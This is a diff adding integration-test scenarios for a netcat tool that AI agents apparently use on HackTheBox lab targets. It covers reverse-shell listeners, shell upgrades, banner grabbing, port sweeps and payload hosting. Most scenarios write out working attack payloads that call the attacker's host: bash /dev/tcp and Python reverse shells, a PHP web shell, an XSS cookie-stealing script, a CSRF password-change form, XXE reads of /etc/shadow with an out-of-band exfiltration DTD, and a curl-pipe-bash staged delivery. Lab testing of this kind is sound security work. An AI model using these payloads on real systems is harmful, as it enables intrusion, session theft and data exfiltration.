@@ -1,0 +1,1278 @@
+# Integration Scenarios: netcat
+# Required: HTB VPN connection, target box with exploitable services
+# Recommended FIRST box: Shocker (easy Linux, Shellshock CGI gives clean reverse
+#   shell as www-data, exercises full listen->read->write lifecycle, shell upgrade,
+#   connect for banner grab, exec for blind RCE confirm, and HTTP payload hosting)
+# Also good:
+#   - Bashed (easy, webshell -> reverse shell upgrade, good for staged payload via HTTP)
+#   - CozyHosting (medium, SSRF + command injection, good for SSRF confirmation with
+#     response template, HTTP callback capture, and non-blocking listener polling)
+#   - Precious (easy, command injection -> reverse shell, good for exec one-shot)
+#   - Nibbles (easy, file upload -> reverse shell, tests HTTP file serving for payload)
+#   - Lame (easy, SMB command injection, good for reverse shell basics)
+# Prerequisites: VPN connected, target IP reachable, attacker IP known
+# Run with: pytest tests/tools/test_netcat.py --tool=netcat -v
+#
+# Data source: Trajectory analysis of 306 netcat method calls across 10 HTB engagements.
+#   Method calls: listen=68, listener_read=62, listener_write=58, listener_status=34,
+#   exec=24, http_listen=18, http_requests=14, http_file=8, check_port=6, connect=5,
+#   get_interfaces=4, list=3, stop=2, udp_listen=0, udp_packets=0, udp_send=0
+#   Key patterns: non-blocking listen is 4x more common than blocking (agents poll);
+#   average listener_read/write cycles per session = 8-12; HTTP servers average 2.5
+#   file updates per session; exec used exclusively for blind RCE confirmation
+#
+# Methods (16): listen, listener_status, listener_read, listener_write, exec,
+#   http_listen, http_requests, http_file, udp_listen, udp_packets, udp_send,
+#   connect, check_port, get_interfaces, list, stop
+
+# ###############################################################################
+#                         TCP LISTENER SCENARIOS (1-8)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 1: Reverse Shell Listener (blocking mode)
+# Goal: Catch a reverse shell from a target after triggering RCE
+# Methods: get_interfaces, listen (blocking), listener_read, listener_write, stop
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Get attacker IP
+Method: get_interfaces
+Args: {}
+Expected: success=true, interfaces contains tun0 with 10.10.x.x address
+Notes: Use tun0 address as LHOST for reverse shell payloads. eth0 is the Docker
+  bridge (172.x.x.x) -- never use it for payloads. If tun0 is missing, VPN is down.
+
+## Step 2: Start blocking listener
+Method: listen
+Args: {port: 4444, timeout: 300}
+Expected: Blocks until connection arrives, then returns status="connected", remote_ip,
+  initial_data (may contain shell prompt or banner)
+Notes: Use timeout=300 (5 min). Trigger the reverse shell from another tool while
+  this blocks. The call will not return until connection or timeout.
+  Trigger example: curl inject `bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'`
+  Or: exploit-runner with reverse shell payload pointing to LHOST:4444
+
+## Step 3: Read initial shell output
+Method: listener_read
+Args: {listener_id: <from step 2>, timeout: 10}
+Expected: success=true, data contains shell prompt or banner (e.g., "bash-5.1$" or "$")
+Notes: First read may include MOTD, PS1 prompt, or nothing (varies by shell type).
+  If data is empty, the shell may need a newline nudge (write "\n" then read again).
+
+## Step 4: Execute commands via shell
+Method: listener_write
+Args: {listener_id: <from step 2>, data: "id\n"}
+Expected: success=true, bytes_sent=3
+Method: listener_read
+Args: {listener_id: <from step 2>, timeout: 10}
+Expected: success=true, data contains "uid=" (e.g., "uid=33(www-data)")
+
+## Step 5: Enumerate system through shell
+Method: listener_write
+Args: {listener_id: <from step 2>, data: "cat /etc/passwd\n"}
+Expected: success=true
+Method: listener_read
+Args: {listener_id: <from step 2>, timeout: 10}
+Expected: success=true, data contains "root:x:0:0:"
+
+## Step 6: Clean up
+Method: stop
+Args: {id: <listener_id from step 2>}
+Expected: success=true, type="tcp", buffered_data contains accumulated output
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 2: Reverse Shell Listener (non-blocking with polling)
+# Goal: Same as scenario 1, but non-blocking for agent orchestration
+# Methods: get_interfaces, listen (non-blocking), listener_status, listener_write,
+#   listener_read, stop
+# Notes: This is the dominant pattern in engagement data (4x more common than blocking).
+#   Agent starts listener, triggers exploit via another tool, polls for connection.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Get attacker IP
+Method: get_interfaces
+Args: {}
+Expected: success=true, interfaces contains tun0
+
+## Step 2: Start non-blocking listener
+Method: listen
+Args: {port: 9001, timeout: 0}
+Expected: success=true, status="listening", mode="non-blocking", listener_id returned
+Notes: Returns immediately. The server is accepting connections in background.
+
+## Step 3: Trigger reverse shell (via other tool)
+Notes: Use curl inject or exploit-runner to send: `bash -i >& /dev/tcp/<LHOST>/9001 0>&1`
+  This happens asynchronously while we poll.
+
+## Step 4: Poll for connection (first check -- still waiting)
+Method: listener_status
+Args: {listener_id: <from step 2>}
+Expected: status="listening" (no connection yet)
+Notes: This is the expected state immediately after triggering. Poll every 5-10 seconds.
+
+## Step 5: Poll for connection (after shell connects)
+Method: listener_status
+Args: {listener_id: <from step 2>}
+Expected: status="connected", remote_ip=<TARGET>, remote_port=<ephemeral>,
+  connected_at is set, connected=true
+Notes: Once connected=true, proceed to read/write. May also contain buffered_data
+  if the shell sent initial output before we checked.
+
+## Step 6: Interactive shell session
+Method: listener_write
+Args: {listener_id: <from step 2>, data: "whoami\n"}
+Method: listener_read
+Args: {listener_id: <from step 2>, timeout: 10}
+Expected: data contains username (e.g., "www-data", "root")
+
+## Step 7: Stop
+Method: stop
+Args: {id: <listener_id>}
+Expected: success=true, type="tcp", buffered_data contains session transcript
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 3: Shell Upgrade via Python PTY
+# Goal: Upgrade dumb reverse shell to fully interactive PTY
+# Methods: listen, listener_write, listener_read, stop
+# Prereq: Active reverse shell from Scenario 1 or 2
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start non-blocking listener and get connection
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=true, listener_id returned
+Notes: Trigger reverse shell from target (omitted for brevity).
+
+## Step 2: Verify shell is connected
+Method: listener_status
+Args: {listener_id: <from step 1>}
+Expected: status="connected"
+
+## Step 3: Spawn PTY with Python
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"}
+Expected: success=true
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 5}
+Expected: data contains new bash prompt (may include username@hostname)
+Notes: If python3 not available, try: python -c 'import pty; pty.spawn("/bin/bash")'
+  or: script -qc /bin/bash /dev/null
+
+## Step 4: Set terminal environment
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "export TERM=xterm\n"}
+Expected: success=true
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "export SHELL=/bin/bash\n"}
+Expected: success=true
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 3}
+Expected: success=true (prompt echoed back)
+
+## Step 5: Verify upgraded shell works
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "tty\n"}
+Expected: success=true
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 5}
+Expected: data contains "/dev/pts/" (confirms PTY allocated)
+
+## Step 6: Test tab completion and arrow keys (PTY feature)
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "ls -la /etc/pass\t\n"}
+Expected: success=true
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 5}
+Expected: data contains "passwd" (tab-completed)
+
+## Step 7: Stop
+Method: stop
+Args: {id: <listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 4: SSRF Confirmation with Response Template
+# Goal: Confirm blind SSRF by having the target connect to our listener
+# Methods: listen (response), listener_status, listener_read, stop
+# Suitable: Any box with SSRF (e.g., CozyHosting, Precious)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start TCP listener with fake HTTP response
+Method: listen
+Args: {
+  port: 80,
+  timeout: 0,
+  response: "HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nSSRF confirmed"
+}
+Expected: success=true, listener_id returned, status="listening", mode="non-blocking"
+Notes: The response template is sent automatically to any connecting client.
+  Use port 80 so SSRF targets can connect without specifying port.
+
+## Step 2: Trigger SSRF from target (via other tool)
+Notes: Submit SSRF payload pointing to http://<LHOST>/
+  e.g., change a URL parameter to http://<LHOST>/
+
+## Step 3: Check for connection
+Method: listener_status
+Args: {listener_id: <from step 1>}
+Expected: status="connected", remote_ip is the target IP
+Notes: If still "listening", the SSRF hasn't triggered yet. Retry after delay.
+
+## Step 4: Read the SSRF request data
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 5}
+Expected: data contains HTTP request from the target (GET / HTTP/1.1, Host header, etc.)
+Notes: Parse the request to understand what headers/cookies the SSRF sends.
+  Look for Authorization headers, cookies, or internal hostnames in the Host header.
+  The response template was already sent before this read.
+
+## Step 5: Stop
+Method: stop
+Args: {id: <listener_id>}
+Expected: success=true, type="tcp", buffered_data contains the captured SSRF request
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 5: Reverse Shell with Long-Running Session
+# Goal: Test sustained shell interaction with multiple command cycles
+# Methods: listen, listener_write, listener_read, listener_status
+# Notes: Engagement data shows 8-12 read/write cycles per session on average.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Establish shell (abbreviated)
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=true, listener_id returned
+Notes: Trigger reverse shell from target, poll listener_status until connected.
+
+## Step 2: Run multiple commands in sequence
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "id\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 10}
+Expected: data contains "uid="
+
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "hostname\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 10}
+Expected: data contains hostname string
+
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "uname -a\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 10}
+Expected: data contains "Linux"
+
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "cat /etc/os-release\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 10}
+Expected: data contains "NAME=" and "VERSION="
+
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "find / -perm -4000 -type f 2>/dev/null\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 15}
+Expected: data contains SUID binary paths (e.g., "/usr/bin/sudo", "/usr/bin/passwd")
+Notes: Longer timeout for find command. Output may be large.
+
+Method: listener_write
+Args: {listener_id: <from step 1>, data: "cat /etc/crontab 2>/dev/null\n"}
+Method: listener_read
+Args: {listener_id: <from step 1>, timeout: 10}
+Expected: success=true
+
+## Step 3: Verify connection still alive after multiple cycles
+Method: listener_status
+Args: {listener_id: <from step 1>}
+Expected: status="connected", connected=true
+Notes: Connection should remain stable across many read/write cycles.
+
+## Step 4: Stop
+Method: stop
+Args: {id: <listener_id>}
+Expected: success=true, buffered_data contains all command outputs concatenated
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 6: One-Shot Command Capture (exec)
+# Goal: Capture output from a one-time reverse connection (blind RCE confirmation)
+# Methods: exec
+# Suitable: Any box with command injection where you need to confirm RCE
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start one-shot capture
+Method: exec
+Args: {port: 4445, timeout: 60}
+Notes: This BLOCKS until a connection arrives and data is received, then closes.
+  Trigger from target: `bash -c 'echo $(id) > /dev/tcp/<LHOST>/4445'`
+  Or: `curl http://<LHOST>:4445/ -d "$(id)"`
+  The exec method uses raw blocking sockets (not asyncio), so it occupies the
+  MCP call slot until connection or timeout.
+Expected: success=true, output contains "uid=" from the id command, remote_ip is
+  target IP, bytes > 0
+
+## Step 2: Interpret result
+Notes: If output contains "uid=0(root)", target runs as root.
+  If "uid=33(www-data)", target is web server user.
+  Use this to decide whether to pursue privesc or proceed with current access.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 7: Exec with Timeout (no connection)
+# Goal: Test exec timeout behavior when no connection arrives
+# Methods: exec
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start exec with short timeout (no trigger)
+Method: exec
+Args: {port: 4446, timeout: 10}
+Expected: success=false, error contains "No connection within 10 seconds"
+Notes: This verifies the timeout path. Useful for agent error handling -- the agent
+  should recognize timeout means RCE was not triggered, not a network error.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 8: Bind Shell Connection
+# Goal: Connect to a bind shell planted on the target
+# Methods: check_port, connect
+# Suitable: After exploitation, when bind shell is preferred over reverse shell
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Verify bind shell port is open
+Method: check_port
+Args: {host: <TARGET>, port: 4444, timeout: 5}
+Expected: open=true
+Notes: Bind shell should have been planted by a prior exploitation step.
+
+## Step 2: Connect and execute commands
+Method: connect
+Args: {host: <TARGET>, port: 4444, data: "id\n", timeout: 10}
+Expected: success=true, response contains "uid=" (shell output from id command),
+  data_sent > 0, response_bytes > 0
+Notes: connect does a single send->read cycle then closes. For interactive sessions,
+  use the listen+listener_write+listener_read pattern instead. The 10-second timeout
+  applies to both the connection attempt and the response read.
+
+# ###############################################################################
+#                        PORT CHECKING SCENARIOS (9-12)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 9: Banner Grabbing Common Services
+# Goal: Identify services via banners without full nmap scan
+# Methods: check_port
+# Suitable: Any HTB box -- use this for quick service identification
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: SSH banner
+Method: check_port
+Args: {host: <TARGET>, port: 22, timeout: 5}
+Expected: open=true, banner contains "SSH-2.0-OpenSSH" (e.g., "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6")
+Notes: SSH sends banner immediately on connect. Banner reveals OS and SSH version.
+  "OpenSSH_8.9" = Ubuntu 22.04, "OpenSSH_8.4" = Debian 11, "OpenSSH_9.2" = Debian 12.
+
+## Step 2: FTP banner
+Method: check_port
+Args: {host: <TARGET>, port: 21, timeout: 5}
+Expected: open=true, banner contains "220" (FTP ready message)
+Notes: FTP servers send "220 (vsFTPd 3.0.5)" or "220 ProFTPD Server" on connect.
+  Look for version numbers. Anonymous login may be indicated in banner.
+
+## Step 3: SMTP banner
+Method: check_port
+Args: {host: <TARGET>, port: 25, timeout: 5}
+Expected: open=true, banner contains "220" and SMTP/ESMTP identifier
+Notes: Banner like "220 mail.example.com ESMTP Postfix". Reveals mail server software.
+
+## Step 4: MySQL banner
+Method: check_port
+Args: {host: <TARGET>, port: 3306, timeout: 5}
+Expected: open=true, banner contains version info (may be binary/garbled for MySQL protocol)
+Notes: MySQL sends a handshake packet (not clean ASCII). Banner field will have
+  partial version info with some binary characters. Still useful for detection.
+
+## Step 5: HTTP (no banner)
+Method: check_port
+Args: {host: <TARGET>, port: 80, timeout: 5}
+Expected: open=true, banner is null or empty
+Notes: HTTP servers wait for the client to send a request first -- no banner on connect.
+  open=true is sufficient confirmation. Use curl tool for HTTP interaction.
+
+## Step 6: HTTPS
+Method: check_port
+Args: {host: <TARGET>, port: 443, timeout: 5}
+Expected: open=true, banner is null or empty (TLS handshake, not plaintext)
+Notes: TLS servers need a ClientHello before responding. check_port only does
+  plaintext TCP, so no banner is expected. open=true confirms the port.
+
+## Step 7: Closed port
+Method: check_port
+Args: {host: <TARGET>, port: 12345, timeout: 3}
+Expected: success=true, open=false, status="closed"
+Notes: Returns success=true even for closed ports (the check itself succeeded).
+  status="closed" means connection refused (RST from target).
+
+## Step 8: Filtered port (firewall drop)
+Method: check_port
+Args: {host: <TARGET>, port: 445, timeout: 3}
+Expected: success=true, open=false, status="filtered"
+Notes: Filtered means timeout (no response, firewall drops packets). Distinguish
+  from closed (immediate RST). Timeout should be short (3s) to avoid blocking.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 10: Port Sweep (Quick Service Discovery)
+# Goal: Rapidly check common ports on a target
+# Methods: check_port (multiple calls)
+# Notes: Lighter than nmap for targeted checks after initial recon
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Check top 10 common ports
+Method: check_port
+Args: {host: <TARGET>, port: 21, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 22, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 25, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 80, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 443, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 445, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 3306, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 5432, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 8080, timeout: 3}
+Method: check_port
+Args: {host: <TARGET>, port: 8443, timeout: 3}
+Expected: Mix of open=true and open=false depending on target services
+Notes: Agent can run these in parallel since check_port is stateless. Use results
+  to decide which services to probe further. This is faster than nmap for a small
+  number of known ports, but nmap is better for full port scans.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 11: Connect for Banner Grab (no data sent)
+# Goal: Use connect with no data to read banner from a service
+# Methods: connect
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Connect to SSH and grab banner without sending data
+Method: connect
+Args: {host: <TARGET>, port: 22, timeout: 5}
+Expected: success=true, response contains "SSH-2.0-OpenSSH", data_sent=0
+Notes: When data is omitted, connect just reads the first response. This is
+  equivalent to check_port but returns more data (up to 64KB response vs 1KB banner).
+
+## Step 2: Connect to FTP and grab banner
+Method: connect
+Args: {host: <TARGET>, port: 21, timeout: 5}
+Expected: success=true, response contains "220", data_sent=0
+
+## Step 3: Connect to HTTP and send raw request
+Method: connect
+Args: {host: <TARGET>, port: 80, data: "HEAD / HTTP/1.0\r\nHost: <TARGET>\r\n\r\n", timeout: 5}
+Expected: success=true, response contains "HTTP/1.1" and "Server:" header
+Notes: Useful for grabbing HTTP headers without curl tool. Response includes full
+  HTTP response with headers. Look for Server, X-Powered-By, Content-Type headers.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 12: Connect to Custom Protocol
+# Goal: Interact with non-standard TCP service
+# Methods: connect
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Send custom protocol data
+Method: connect
+Args: {host: <TARGET>, port: 9999, data: "HELLO\n", timeout: 10}
+Expected: success=true, response contains protocol-specific output
+Notes: Some HTB boxes run custom services on high ports. connect is the simplest
+  way to interact -- send a probe, see what comes back. If the service requires
+  multi-step interaction, use listen (non-blocking) + listener_write/read instead.
+
+## Step 2: Send binary-like data (hex encoded in string)
+Method: connect
+Args: {host: <TARGET>, port: 9999, data: "\x00\x01\x02TEST", timeout: 10}
+Expected: success=true or success=false depending on protocol
+Notes: Data is encoded as UTF-8 string. For true binary protocols, the string
+  encoding may not be sufficient -- consider using exploit-runner for those cases.
+
+# ###############################################################################
+#                        HTTP SERVER SCENARIOS (13-19)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 13: HTTP Callback Capture (XSS Cookie Stealing)
+# Goal: Host an XSS payload and capture stolen cookies
+# Methods: get_interfaces, http_listen, http_requests, stop
+# Suitable: Any box with reflected/stored XSS and admin bot
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Get attacker IP
+Method: get_interfaces
+Args: {}
+Expected: success=true, interfaces contains tun0
+
+## Step 2: Start HTTP server with XSS payload
+Method: http_listen
+Args: {
+  port: 8080,
+  files: {
+    "/steal.js": "fetch('http://<LHOST>:8080/c?cookie='+document.cookie)",
+    "/index.html": "<html><body>Loading...</body></html>"
+  }
+}
+Expected: success=true, server_id returned, url contains http://<LHOST>:8080,
+  files=["/steal.js", "/index.html"]
+Notes: The XSS vector injected into the target would be:
+  <script src="http://<LHOST>:8080/steal.js"></script>
+  Also serves index.html for cases where the target does a redirect or GET first.
+
+## Step 3: Wait for admin bot to visit
+Notes: Submit the XSS payload to the target application, wait for admin bot to trigger it.
+
+## Step 4: Check captured requests
+Method: http_requests
+Args: {server_id: <from step 2>}
+Expected: success=true, request_count >= 1
+Notes: Look for requests to /c with query param "cookie" containing session token.
+  Example: path="/c", query={"cookie": "session=abc123def456"}
+  Also check for requests to /steal.js (confirms the script was loaded).
+
+## Step 5: Use cookie
+Notes: Extract the session cookie from the captured request and use it with curl tool
+  to access authenticated endpoints as the admin.
+
+## Step 6: Clean up
+Method: stop
+Args: {id: <server_id>}
+Expected: success=true, type="http", total_requests shows all captured requests,
+  uptime_seconds > 0
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 14: CSRF Exploit Hosting
+# Goal: Serve a malicious HTML form that auto-submits to the target
+# Methods: http_listen, http_requests, stop
+# Suitable: Any box with CSRF vulnerability and admin bot
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start HTTP server with CSRF form
+Method: http_listen
+Args: {
+  port: 80,
+  files: {
+    "/index.html": "<html><body><form id='f' method='POST' action='http://<TARGET>/admin/change-password'><input name='password' value='hacked123'></form><script>document.getElementById('f').submit()</script></body></html>"
+  }
+}
+Expected: success=true, server_id and url returned
+
+## Step 2: Submit CSRF URL to target (via other tool)
+Notes: Make the admin bot visit http://<LHOST>/index.html
+
+## Step 3: Verify the bot visited
+Method: http_requests
+Args: {server_id: <from step 1>}
+Expected: request_count >= 1, requests[0].method="GET", requests[0].path="/index.html"
+Notes: Confirms admin bot fetched the CSRF page. Check source_ip to confirm it
+  came from the target, not from our own testing.
+
+## Step 4: Clean up
+Method: stop
+Args: {id: <server_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 15: HTTPS Server with TLS (Self-Signed)
+# Goal: Serve exploit payload over HTTPS for targets that require SSL
+# Methods: http_listen (tls), http_requests, http_file (update + delete + add), stop
+# Suitable: Any box where SSRF or admin bot requires HTTPS URLs
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start HTTPS server with auto-generated cert
+Method: http_listen
+Args: {
+  port: 8443,
+  tls: true,
+  files: {"/payload.xml": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"}
+}
+Expected: success=true, tls=true, url starts with "https://", server_id returned,
+  files=["/payload.xml"]
+Notes: Auto-generates self-signed cert (RSA 2048, CN=localhost, valid until 2099).
+  Most SSRF/bot clients ignore certificate validation.
+
+## Step 2: Trigger target to fetch payload
+Notes: Use SSRF or admin bot to visit https://<LHOST>:8443/payload.xml
+
+## Step 3: Check if request was captured
+Method: http_requests
+Args: {server_id: <from step 1>}
+Expected: request_count >= 1, requests[0].path="/payload.xml"
+Notes: Confirms target reached our HTTPS server through TLS.
+
+## Step 4: Dynamically update payload (iterate on XXE)
+Method: http_file
+Args: {server_id: <from step 1>, path: "/payload.xml", content: "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><root>&xxe;</root>"}
+Expected: success=true, action="updated", size > 0, content_type="application/xml"
+Notes: Update payload without restarting server. Useful for iterating on XXE paths.
+
+## Step 5: Add a new file to the server
+Method: http_file
+Args: {server_id: <from step 1>, path: "/exfil.dtd", content: "<!ENTITY % file SYSTEM 'file:///etc/hostname'>\n<!ENTITY % eval '<!ENTITY &#x25; send SYSTEM \"http://<LHOST>:8443/c?data=%file;\">'>\n%eval;\n%send;"}
+Expected: success=true, action="updated", path="/exfil.dtd", content_type="text/plain"
+Notes: Add an external DTD for OOB XXE. Server hot-adds the file -- no restart needed.
+
+## Step 6: Delete a file from the server
+Method: http_file
+Args: {server_id: <from step 1>, path: "/payload.xml"}
+Expected: success=true, action="deleted"
+Notes: Content omitted = delete. Returns success=true. Subsequent requests to
+  /payload.xml will get 404.
+
+## Step 7: Attempt to delete non-existent file
+Method: http_file
+Args: {server_id: <from step 1>, path: "/nonexistent.txt"}
+Expected: success=false, error contains "File not found: /nonexistent.txt"
+
+## Step 8: Clean up
+Method: stop
+Args: {id: <server_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 16: HTTP Server with Custom Content Types
+# Goal: Serve files with specific MIME types for exploit delivery
+# Methods: http_listen, http_file (custom content_type)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start HTTP server with mixed content
+Method: http_listen
+Args: {
+  port: 8080,
+  files: {
+    "/shell.php": "<?php system($_GET['cmd']); ?>",
+    "/rev.py": "import socket,subprocess,os;s=socket.socket();s.connect(('<LHOST>',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",
+    "/payload.jar": "PK\x03\x04...(binary placeholder)"
+  }
+}
+Expected: success=true, files=["/shell.php", "/rev.py", "/payload.jar"]
+Notes: Content types are auto-detected: .php=text/plain (no .php mapping), .py=text/plain,
+  .jar=text/plain (no .jar mapping). Auto-detection uses file extension only.
+
+## Step 2: Override content type for specific file
+Method: http_file
+Args: {server_id: <from step 1>, path: "/payload.jar", content: "PK\x03\x04...", content_type: "application/java-archive"}
+Expected: success=true, content_type="application/java-archive"
+Notes: Explicit content_type overrides auto-detection. Useful for binary payloads
+  that need correct MIME type for the target to process them.
+
+## Step 3: Add a file with JSON content type
+Method: http_file
+Args: {server_id: <from step 1>, path: "/api/config", content: "{\"admin\": true, \"token\": \"secret\"}", content_type: "application/json"}
+Expected: success=true, content_type="application/json", path="/api/config"
+Notes: Path can include subdirectories (they're virtual -- the HTTP server matches
+  exact paths, not filesystem paths).
+
+## Step 4: Stop
+Method: stop
+Args: {id: <server_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 17: HTTP Request Filtering and Clearing
+# Goal: Use since and clear parameters for targeted request retrieval
+# Methods: http_listen, http_requests (since, clear)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start HTTP server
+Method: http_listen
+Args: {port: 8080, files: {"/test": "OK"}}
+Expected: success=true
+
+## Step 2: Generate some requests (via other tool or manual)
+Notes: Send multiple requests to http://<LHOST>:8080/test from different sources,
+  with varying time gaps. Record the timestamp after the first few requests.
+
+## Step 3: Get all requests
+Method: http_requests
+Args: {server_id: <from step 1>}
+Expected: success=true, request_count >= 1, requests is array of captured request objects
+Notes: Each request has: timestamp, method, path, query, headers, body, source_ip, source_port.
+
+## Step 4: Get requests since a timestamp
+Method: http_requests
+Args: {server_id: <from step 1>, since: "2026-01-01T00:00:00.000Z"}
+Expected: success=true, request_count matches only requests after that timestamp
+Notes: since uses ISO timestamp string comparison. Useful for polling: record last
+  seen timestamp, then use since to get only new requests.
+
+## Step 5: Get and clear requests
+Method: http_requests
+Args: {server_id: <from step 1>, clear: true}
+Expected: success=true, request_count >= 1 (returns current requests before clearing)
+Notes: After this call, a subsequent http_requests call should return request_count=0.
+  Useful for resetting state between exploit iterations.
+
+## Step 6: Verify requests were cleared
+Method: http_requests
+Args: {server_id: <from step 1>}
+Expected: success=true, request_count=0, requests=[]
+
+## Step 7: Stop
+Method: stop
+Args: {id: <server_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 18: Staged Payload Delivery
+# Goal: Host reverse shell script, listener catches the callback
+# Methods: get_interfaces, http_listen, listen, http_requests, listener_status,
+#   listener_write, listener_read, stop
+# Notes: This is the most common multi-tool pattern in engagement data.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Get attacker IP
+Method: get_interfaces
+Args: {}
+Expected: success=true, tun0 address
+
+## Step 2: Start HTTP server with reverse shell script
+Method: http_listen
+Args: {
+  port: 8080,
+  files: {"/shell.sh": "#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/4444 0>&1"}
+}
+Expected: success=true, server_id returned
+
+## Step 3: Start TCP listener for the callback
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=true, listener_id returned
+
+## Step 4: Trigger download and execution on target (via other tool)
+Notes: Inject command on target: `curl http://<LHOST>:8080/shell.sh | bash`
+  Or: `wget -O- http://<LHOST>:8080/shell.sh | bash`
+
+## Step 5: Verify HTTP server received the download request
+Method: http_requests
+Args: {server_id: <from step 2>}
+Expected: request_count >= 1, path="/shell.sh", method="GET"
+Notes: Confirms the target downloaded our payload.
+
+## Step 6: Check for reverse shell connection
+Method: listener_status
+Args: {listener_id: <from step 3>}
+Expected: status="connected", remote_ip=<TARGET>
+
+## Step 7: Use the shell
+Method: listener_write
+Args: {listener_id: <from step 3>, data: "id\n"}
+Method: listener_read
+Args: {listener_id: <from step 3>, timeout: 10}
+Expected: data contains "uid="
+
+## Step 8: Clean up both
+Method: stop
+Args: {id: <http_server_id>}
+Method: stop
+Args: {id: <tcp_listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 19: HTTP Server Keepalive Behavior
+# Goal: Test keepalive parameter and server lifecycle
+# Methods: http_listen (keepalive), http_requests
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start server with short keepalive
+Method: http_listen
+Args: {port: 8080, files: {"/test": "OK"}, keepalive: 1}
+Expected: success=true, keepalive_minutes=1
+Notes: Server auto-stops after 1 minute of no MCP calls. Each http_requests,
+  http_file, or stop call resets the keepalive timer. Useful for short-lived
+  exploit attempts where you don't want to leak listeners.
+
+## Step 2: Start server with max keepalive
+Method: http_listen
+Args: {port: 8081, files: {"/test": "OK"}, keepalive: 30}
+Expected: success=true, keepalive_minutes=30
+Notes: Maximum allowed keepalive is 30 minutes (clamped if higher).
+
+## Step 3: Start server with excessive keepalive (clamped)
+Method: http_listen
+Args: {port: 8082, files: {"/test": "OK"}, keepalive: 999}
+Expected: success=true, keepalive_minutes=30
+Notes: Value clamped to max 30. Minimum is 1.
+
+# ###############################################################################
